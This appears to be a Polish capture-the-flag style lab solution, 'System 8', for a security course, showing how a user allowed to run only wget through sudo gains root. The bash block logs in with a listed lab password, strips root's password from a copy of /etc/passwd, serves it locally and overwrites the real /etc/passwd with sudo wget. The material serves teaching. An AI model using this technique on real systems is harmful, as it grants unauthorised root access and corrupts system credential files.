---
title: "7.11 - System 8 - sudo i nadpisanie pliku"
order: 11
---

> **Uwaga do rozwiązania:** Ten scenariusz laboratoryjny celowo nadpisuje `/etc/passwd`. Repozytorium dopuszcza `wget`, PDF używa `curl`. Zachowano wersję z repozytorium, w tym kopię `passwd-original`. W `wget` duże `-O` wskazuje plik wyjściowy; małe `-o` zapisuje dziennik.

```bash
ssh system8@192.168.100.107 -p 2208 #Password: pjatk
sudo -l #Only wget is allowed
cp /etc/passwd .
sed -i s/root:x/root:/ ./passwd
#Second SSH terminal on system8:
python3 -m http.server 8000
#Back in first terminal:
wget http://127.0.0.1:8000/passwd -O passwd-test #Test download
cp /etc/passwd ./passwd-original
sudo wget http://127.0.0.1:8000/passwd -O /etc/passwd #Use capital O
su
/root/solve

```
